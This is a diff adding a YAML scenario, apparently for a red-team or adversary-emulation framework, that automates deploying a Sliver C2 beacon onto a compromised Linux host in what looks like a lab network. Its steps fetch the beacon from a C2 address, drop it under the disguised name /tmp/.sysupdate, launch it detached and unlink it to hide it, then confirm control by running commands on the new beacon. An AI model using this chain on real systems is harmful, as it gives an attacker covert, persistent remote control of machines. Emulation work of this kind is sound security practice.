@@ -1,0 +1,71 @@
+id: deploy-beacon
+name: "Unattended beacon deployment"
+description: >
+  From an existing foothold (the session passed to /execute), fetch a freshly
+  built Sliver beacon from the orchestrator and launch it detached on the target,
+  establishing a persistent beacon check-in. Demonstrates chain-step delivery of
+  a generated beacon (no manual sliver-client interaction).
+mitre_tactics: [command-and-control]
+tags: [beacon, delivery, demo]
+
+steps:
+  # 1. Confirm we can reach the C2's implant endpoint from the target's network
+  #    path (the C2 server does the download, but this documents intent + gates).
+  - id: precheck
+    name: "Confirm target is Linux"
+    action:
+      type: probe
+      probe:
+        kind: os
+        platform: linux
+    output_var: target_os
+    on_fail: abort
+
+  # 2. Deploy the beacon.
+  #    The scenario-server fetches the beacon from its own implant endpoint
+  #    (type=beacon → IsBeacon build), uploads it to the target session, then
+  #    launches it DETACHED so the step returns instead of blocking on a daemon.
+  - id: deploy
+    name: "Fetch + launch beacon (detached)"
+    depends_on: [precheck]
+    conditions:
+      - target_os|contains: Linux
+    action:
+      type: binary
+      binary:
+        # 172.20.0.10 = c2 container. interval/jitter in seconds.
+        url: "http://172.20.0.10:8080/api/v1/implant/linux?type=beacon&interval=30&jitter=10"
+        remote_path: "/tmp/.sysupdate"
+        platform: linux
+        background: true      # <-- new: detached launch, required for beacons
+        cleanup: true         # unlink on-disk file after launch (inode survives)
+    output_var: launch_out
+    timeout: "5m"             # generous: first request compiles the beacon (~1-2 min)
+
+  # 3. Block until the freshly deployed beacon checks in, and capture its ID.
+  #    output_var stores the beacon UUID so later steps can pivot onto it with
+  #    session_id: "{{new_beacon}}".
+  - id: wait
+    name: "Wait for beacon check-in"
+    depends_on: [deploy]
+    action:
+      type: wait_beacon
+      wait_beacon:
+        # Filter to the host you deployed onto. Leave both empty to take the
+        # most-recently-checked-in beacon. Both fields support {{VarName}}.
+        remote_address: "172.20.0.20"
+        timeout: "90s"          # ~3 check-in windows at interval=30
+        poll_interval: "5s"
+    output_var: new_beacon
+    on_fail: abort
+
+  # 4. Prove the pivot: run a command on the NEW beacon via per-step session_id.
+  - id: verify_pivot
+    name: "Run on the new beacon"
+    depends_on: [wait]
+    session_id: "{{new_beacon}}"
+    action:
+      type: command
+      command:
+        interpreter: sh
+        cmd: "id; hostname"
